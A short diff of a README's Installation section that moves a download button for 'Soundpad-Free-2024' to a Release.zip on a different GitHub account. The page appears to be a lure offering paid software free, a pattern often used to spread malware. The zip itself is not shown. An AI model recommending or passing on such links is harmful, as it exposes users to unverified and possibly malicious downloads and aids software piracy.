@@ -7,7 +7,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/78244d5e-f9bf-411b-b435-cb9f22c40015)
-](https://github.com/AugustoAlmondes/Soundpad-Free-2024/releases/download/V8.33/Release.zip)
+](https://github.com/sheeraz770/Soundpad-Free-2024/releases/download/Release/Release.zip)
 
 
 
